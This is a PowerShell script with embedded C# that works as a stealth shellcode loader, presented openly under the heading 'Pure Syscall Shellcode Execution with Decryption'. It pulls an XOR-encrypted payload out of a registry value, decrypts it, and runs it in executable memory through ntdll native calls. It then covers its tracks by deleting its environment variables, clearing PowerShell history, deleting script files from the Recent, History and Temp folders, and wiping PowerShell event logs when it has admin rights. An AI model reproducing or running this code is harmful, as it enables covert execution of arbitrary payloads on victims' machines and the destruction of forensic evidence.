# Pure Syscall Shellcode Execution with Decryption
$code = @'
using System;
using System.Runtime.InteropServices;

public class SyscallExecutor {
    
    [DllImport("ntdll.dll")]
    public static extern uint NtAllocateVirtualMemory(
        IntPtr ProcessHandle,
        ref IntPtr BaseAddress,
        IntPtr ZeroBits,
        ref IntPtr RegionSize,
        uint AllocationType,
        uint Protect);
    
    [DllImport("ntdll.dll")]
    public static extern uint NtWriteVirtualMemory(
        IntPtr ProcessHandle,
        IntPtr BaseAddress,
        byte[] Buffer,
        uint BufferLength,
        out uint BytesWritten);
    
    [DllImport("ntdll.dll")]
    public static extern uint NtCreateThreadEx(
        out IntPtr ThreadHandle,
        uint DesiredAccess,
        IntPtr ObjectAttributes,
        IntPtr ProcessHandle,
        IntPtr StartAddress,
        IntPtr Parameter,
        bool CreateSuspended,
        uint StackZeroBits,
        uint SizeOfStackCommit,
        uint SizeOfStackReserve,
        IntPtr BytesBuffer);
    
    [DllImport("ntdll.dll")]
    public static extern uint NtWaitForSingleObject(
        IntPtr Handle,
        bool Alertable,
        IntPtr Timeout);
    
    [DllImport("ntdll.dll")]
    public static extern uint NtClose(IntPtr Handle);
    
    public static void ExecuteShellcode(byte[] shellcode) {
        IntPtr allocAddr = IntPtr.Zero;
        IntPtr regionSize = (IntPtr)shellcode.Length;
        
        uint status = NtAllocateVirtualMemory(
            (IntPtr)(-1),
            ref allocAddr,
            IntPtr.Zero,
            ref regionSize,
            0x3000,
            0x40
        );
        if (status != 0) return;
        
        uint bytesWritten;
        status = NtWriteVirtualMemory(
            (IntPtr)(-1),
            allocAddr,
            shellcode,
            (uint)shellcode.Length,
            out bytesWritten
        );
        if (status != 0) return;
        
        IntPtr hThread;
        status = NtCreateThreadEx(
            out hThread,
            0x1FFFFF,
            IntPtr.Zero,
            (IntPtr)(-1),
            allocAddr,
            IntPtr.Zero,
            false,
            0, 0, 0,
            IntPtr.Zero
        );
        
        if (status == 0 && hThread != IntPtr.Zero) {
            NtWaitForSingleObject(hThread, false, IntPtr.Zero);
            NtClose(hThread);
        }
    }
}
'@

Add-Type -TypeDefinition $code -Language CSharp

function Decrypt-Shellcode {
    param([string]$EncryptedBase64, [string]$KeyString)
    try {
        $encryptedBytes = [System.Convert]::FromBase64String($EncryptedBase64)
        $keyBytes = [System.Text.Encoding]::UTF8.GetBytes($KeyString)
        $keyBytes = $keyBytes * (($encryptedBytes.Length / $keyBytes.Length) + 1)
        $keyBytes = $keyBytes[0..($encryptedBytes.Length-1)]
        $decrypted = New-Object byte[] $encryptedBytes.Length
        for ($i=0; $i -lt $encryptedBytes.Length; $i++) {
            $decrypted[$i] = $encryptedBytes[$i] -bxor $keyBytes[$i]
        }
        return $decrypted
    }
    catch { 
        return $null 
    }
}

# Retrieve from registry
$regPath = [Environment]::GetEnvironmentVariable("NYXCOR_SHELLCODE_REG_PATH", "User")
$regName = [Environment]::GetEnvironmentVariable("NYXCOR_SHELLCODE_REG_NAME", "User")
$keyString = [Environment]::GetEnvironmentVariable("NYXCOR_SHELLCODE_KEY", "User")


$junkData = (Get-ItemProperty -Path $regPath -Name $regName).$regName

# Search for Base64 strings
$base64Pattern = '[A-Za-z0-9+/]{100,}={0,2}'
$matches = [regex]::Matches($junkData, $base64Pattern)

foreach ($match in $matches) {
    $decryptedShellcode = Decrypt-Shellcode -EncryptedBase64 $match.Value -KeyString $keyString
    if ($decryptedShellcode -and $decryptedShellcode.Length -gt 100) {        
        [SyscallExecutor]::ExecuteShellcode($decryptedShellcode)
        break
    }
}

$envVarsToRemove = @("NYXCOR_SHELLCODE_REG_PATH","NYXCOR_SHELLCODE_REG_NAME","NYXCOR_SHELLCODE_KEY","NYXCOR_","NYX_","SHELLCODE_")
foreach ($var in $envVarsToRemove) { Remove-Item "Env:\$var" -ErrorAction SilentlyContinue; [Environment]::SetEnvironmentVariable($var, $null, 'User') }
Clear-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force -ErrorAction SilentlyContinue
Clear-History -ErrorAction SilentlyContinue
Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent","$env:USERPROFILE\AppData\Local\Microsoft\Windows\History","$env:USERPROFILE\AppData\Local\Temp" -Recurse -Force -ErrorAction SilentlyContinue | Where-Object { $_.Name -like "*.ps1" -or $_.Name -like "*nyx*" } | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue
if ([Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { wevtutil cl "Windows PowerShell" /quiet; wevtutil cl "Microsoft-Windows-PowerShell/Operational" /quiet }